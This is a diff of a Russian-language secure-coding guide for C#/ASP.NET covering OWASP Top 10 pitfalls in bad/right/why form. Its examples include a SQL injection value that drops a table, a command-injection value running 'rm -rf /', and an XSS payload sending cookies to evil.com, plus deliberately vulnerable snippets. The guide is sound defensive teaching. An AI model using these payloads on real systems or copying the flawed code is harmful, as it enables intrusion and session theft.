@@ -4,215 +4,96 @@ description: Безопасность веб-приложений, OWASP Top 10.
 allowed-tools: Read, Grep, Glob
 ---
 
-# OWASP Security Patterns
+# OWASP Security — ловушки
 
 ## A01: Broken Access Control
 
 ### IDOR — доступ к чужим данным
+Плохо: `GET /api/orders/123` → `_repo.GetByIdAsync(id)` без проверки владельца
+Правильно: `if (order.UserId != currentUserId) return Forbid()` — фильтр по владельцу
+Почему: подмена id в URL = доступ к чужим заказам, документам, данным. Самая частая уязвимость в API
 
-```
-// Плохо — пользователь может подменить id
-GET /api/orders/123
+### Эскалация привилегий через request body
+Плохо: `user.Role = dto.Role` — роль приходит из тела запроса, клиент отправляет `Role = "Admin"`
+Правильно: role assignment только через `[Authorize(Roles = "Admin")]` endpoint
+Почему: mass assignment — клиент добавляет поле Role в JSON body. Без DTO = bind всех полей модели
 
-public async Task<Order> GetOrder(int id)
-{
-    return await _repo.GetByIdAsync(id); // любой заказ
-}
-
-// Хорошо — фильтр по текущему пользователю
-public async Task<Order?> GetOrder(int id, int currentUserId)
-{
-    var order = await _repo.GetByIdAsync(id);
-    if (order?.UserId != currentUserId)
-        return null; // или 403
-    return order;
-}
-```
-
-### Эскалация привилегий
-
-```
-// Плохо — роль приходит из запроса
-public async Task UpdateUser(UpdateUserDto dto)
-{
-    user.Role = dto.Role; // клиент может передать Role = "Admin"
-}
-
-// Хорошо — роль из токена, смена роли только для админов
-[Authorize(Roles = "Admin")]
-public async Task SetUserRole(int userId, string role) { }
-```
-
-### Прямой доступ к чужим ресурсам
-
-```
-// Плохо — проверка только аутентификации
-[Authorize]
-public async Task DeleteDocument(int docId) { }
-
-// Хорошо — проверка владельца
-[Authorize]
-public async Task DeleteDocument(int docId)
-{
-    var doc = await _repo.GetByIdAsync(docId);
-    if (doc.OwnerId != currentUserId)
-        throw new ForbiddenException();
-}
-```
+### [Authorize] без проверки владельца
+Плохо: `[Authorize] DeleteDocument(int docId)` — аутентификация ≠ авторизация
+Правильно: проверка `doc.OwnerId == currentUserId` внутри action
+Почему: любой аутентифицированный пользователь удаляет чужие документы. [Authorize] проверяет "кто ты", не "что тебе можно"
 
 ## A02: Cryptographic Failures
 
-### Хранение секретов
+### Секреты в коде
+Плохо: `var connectionString = "Server=prod;Password=P@ssw0rd"` или `var apiKey = "sk-1234567890"`
+Правильно: `configuration.GetConnectionString("Default")` из Vault / env vars / User Secrets
+Почему: git history хранит всё вечно. Даже удалённый секрет доступен через `git log -p`
 
-```
-// Плохо
-var connectionString = "Server=prod;Password=P@ssw0rd";
-var apiKey = "sk-1234567890";
-
-// Хорошо
-var connectionString = configuration.GetConnectionString("Default");
-var apiKey = configuration["ExternalApi:Key"]; // из Vault / env vars
-```
-
-### Хеширование паролей
-
-```
-// Плохо — MD5/SHA без соли
-var hash = MD5.HashData(Encoding.UTF8.GetBytes(password));
-
-// Хорошо — bcrypt/Argon2
-var hash = BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
-var isValid = BCrypt.Net.BCrypt.Verify(password, hash);
-```
+### MD5/SHA без соли для паролей
+Плохо: `MD5.HashData(Encoding.UTF8.GetBytes(password))` — rainbow table за секунды
+Правильно: `BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12)` или Argon2
+Почему: MD5/SHA = fast hash, GPU перебирает миллиарды в секунду. bcrypt = slow hash, намеренно дорогой
 
 ## A03: Injection
 
-### SQL Injection
+### SQL Injection через конкатенацию
+Плохо: `$"SELECT * FROM Users WHERE Name = '{name}'"` — `name = "'; DROP TABLE Users;--"`
+Правильно: параметризованный запрос: `"WHERE Name = @name"` + `new { name }`
+Почему: классика, но до сих пор встречается. Один необработанный input = полный доступ к БД
 
-```
-// Плохо — конкатенация
-var sql = $"SELECT * FROM Users WHERE Name = '{name}'";
-
-// Хорошо — параметризованные запросы
-var sql = "SELECT * FROM Users WHERE Name = @name";
-await connection.QueryAsync(sql, new { name });
-
-// EF Core — безопасно по умолчанию
-await _context.Users.Where(u => u.Name == name).ToListAsync();
-
-// EF Core — ОПАСНО с FromSqlRaw
-await _context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'").ToListAsync();
-// Хорошо:
-await _context.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Name = {name}").ToListAsync();
-```
+### FromSqlRaw с интерполяцией в EF Core
+Плохо: `_context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'")` — interpolation ≠ параметризация
+Правильно: `_context.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Name = {name}")`
+Почему: FromSqlRaw принимает string — интерполяция подставляет значение в строку. FromSqlInterpolated создаёт параметр. Выглядят одинаково, работают по-разному
 
 ### Command Injection
+Плохо: `Process.Start("ping", userInput)` — `userInput = "8.8.8.8 & rm -rf /"`
+Правильно: whitelist validation: `IPAddress.TryParse(userInput, out var ip)` → используй parsed value
+Почему: arbitrary OS command execution → RCE (Remote Code Execution). Один endpoint = полный контроль сервера
 
-```
-// Плохо
-Process.Start("ping", userInput);
-
-// Хорошо — валидация и whitelist
-if (!IPAddress.TryParse(userInput, out var ip))
-    throw new ValidationException("Invalid IP");
-Process.Start("ping", ip.ToString());
-```
-
-### XSS
-
-```
-// Плохо — вывод без экранирования (НЕ ДЕЛАЙ ТАК)
-@Html.Raw(userComment)
-
-// Хорошо
-@userComment                          // Razor экранирует по умолчанию
-element.textContent = userData;       // JS: безопасно
-```
+### XSS через Html.Raw
+Плохо: `@Html.Raw(userComment)` — выводит HTML/JS без экранирования
+Правильно: `@userComment` (Razor экранирует по умолчанию), `element.textContent = data` (JS, безопасно)
+Почему: `<script>document.location='evil.com?c='+document.cookie</script>` — кража сессии. Html.Raw отключает защиту Razor
 
 ## A04: Insecure Design
 
 ### Mass Assignment
+Плохо: `Update([FromBody] User user)` — bind всей Entity из request body
+Правильно: DTO с нужными полями: `UpdateProfileDto(string Name, string Email)` — без Role, IsAdmin, PasswordHash
+Почему: клиент добавляет `"isAdmin": true` в JSON → Entity обновляется с новой ролью
 
-```
-// Плохо — биндинг всей модели
-public async Task<IActionResult> Update([FromBody] User user) { }
-
-// Хорошо — DTO с нужными полями
-public record UpdateProfileDto(string Name, string Email);
-public async Task<IActionResult> Update([FromBody] UpdateProfileDto dto) { }
-```
-
-### Rate Limiting
-
-```
-// Program.cs
-builder.Services.AddRateLimiter(options =>
-{
-    options.AddFixedWindowLimiter("api", opt =>
-    {
-        opt.Window = TimeSpan.FromMinutes(1);
-        opt.PermitLimit = 100;
-    });
-});
-
-[EnableRateLimiting("api")]
-public class OrdersController : ControllerBase { }
-```
+### Нет Rate Limiting на auth endpoints
+Плохо: `/login`, `/register`, `/forgot-password` без ограничения количества запросов
+Правильно: `AddRateLimiter` с жёсткими лимитами на auth endpoints (5-10 req/min)
+Почему: brute force пароля, credential stuffing, SMS-бомбинг через forgot-password
 
 ## A07: Auth Failures
 
-### JWT — типичные ошибки
+### JWT без валидации полей
+Плохо: `handler.ReadJwtToken(jwt)` — парсит без проверки подписи, issuer, audience, lifetime
+Правильно: `handler.ValidateToken(jwt, parameters)` с `ValidateIssuer=true, ValidateAudience=true, ValidateLifetime=true, ValidateIssuerSigningKey=true`
+Почему: самодельный JWT с `"role": "admin"` проходит без проверки подписи. ReadJwtToken = десериализация, не валидация
 
-```
-// Плохо — не проверяет issuer/audience
-var token = handler.ReadJwtToken(jwt); // без валидации подписи!
-
-// Хорошо
-var parameters = new TokenValidationParameters
-{
-    ValidateIssuer = true,
-    ValidIssuer = "myapp",
-    ValidateAudience = true,
-    ValidAudience = "myapp-api",
-    ValidateLifetime = true,
-    ValidateIssuerSigningKey = true,
-    IssuerSigningKey = key
-};
-handler.ValidateToken(jwt, parameters, out _);
-```
-
-### Brute Force защита
-
-```
-// Account lockout
-services.Configure<IdentityOptions>(options =>
-{
-    options.Lockout.MaxFailedAccessAttempts = 5;
-    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
-});
-```
+### Account lockout не настроен
+Плохо: неограниченные попытки входа — brute force по словарю
+Правильно: `MaxFailedAccessAttempts = 5`, `DefaultLockoutTimeSpan = 15 min`
+Почему: 10000 паролей/мин без lockout. С lockout — 5 попыток и 15 мин ожидания
 
 ## A09: Logging Failures
 
-### Что логировать
-
-```
-// Логируй: auth события, ошибки авторизации, input validation fails
-logger.LogWarning("Login failed for {Email} from {IP}", email, ip);
-logger.LogWarning("Access denied: user {UserId} tried to access order {OrderId}", userId, orderId);
-
-// НЕ логируй: пароли, токены, персональные данные
-// logger.LogInformation("Login: {Email}, password: {Password}"); // НИКОГДА
-```
+### Пароли/токены в логах
+Плохо: `logger.Log("Login: {Email}, password: {Password}", email, password)`
+Правильно: логируй auth события, ошибки авторизации, input validation fails — без sensitive data
+Почему: логи попадают в Seq/ELK → доступны всей команде → пароли/токены скомпрометированы
 
 ## Чек-лист ревью
 
-При ревью публичных эндпоинтов проверяй:
-
-- [ ] Есть `[Authorize]` или явная причина для анонимного доступа
-- [ ] Проверка владельца ресурса (не только аутентификация)
-- [ ] DTO вместо прямого биндинга моделей
-- [ ] Параметризованные запросы (нет конкатенации SQL)
-- [ ] Нет секретов в коде, конфигах, логах
-- [ ] Rate limiting на auth/public эндпоинтах
-- [ ] Input validation на границе системы
+- Есть `[Authorize]` + проверка владельца ресурса
+- DTO вместо прямого биндинга Entity
+- Параметризованные запросы (нет конкатенации SQL)
+- FromSqlInterpolated, не FromSqlRaw с интерполяцией
+- Нет секретов в коде, конфигах, логах
+- Rate limiting на auth endpoints
+- JWT: ValidateToken, не ReadJwtToken
